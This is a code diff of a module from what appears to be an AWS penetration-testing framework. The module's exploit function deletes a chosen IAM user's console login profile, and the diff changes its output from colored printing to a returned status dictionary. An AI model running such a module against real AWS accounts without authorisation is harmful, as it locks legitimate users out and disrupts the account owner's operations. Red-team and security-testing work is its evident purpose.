@@ -1,4 +1,4 @@
-from termcolor import colored
+import sys
 
 author = {
     "name":"gl4ssesbo1",
@@ -26,16 +26,21 @@ description = "Delete access of a user to the Management Console"
 aws_command = "aws iam delete-login-profile --user-name Bob --region <region> --profile <profile>"
 
 def exploit(profile, workspace):
+    user = variables['USERNAME']['value']
+
     try:
-        user = variables['USERNAME']['value']
         profile.delete_login_profile(
             UserName=user
         )
-        print(colored("User {} was successfully removed the Login Profile.".format(colored(user, "blue")), "green"))
 
-    except profile.exceptions.EntityTemporarilyUnmodifiableException:
-        print(colored("[*] This user cannot be modified.", "red"))
-    except profile.exceptions.NoSuchEntityException:
-        print(colored("[*] This user does not exist or has no Login Profile.", "red"))
-    except profile.exceptions.LimitExceededException:
-        print()
+        status = f"Successfully removed Login Profile for User {user}"
+
+    except:
+        status = f"Login Profile for User {user} was not removed with error code: {str(sys.exc_info()[1])}."
+
+    return {
+        "User": {
+            "User": user,
+            "Status": status
+        }
+    }
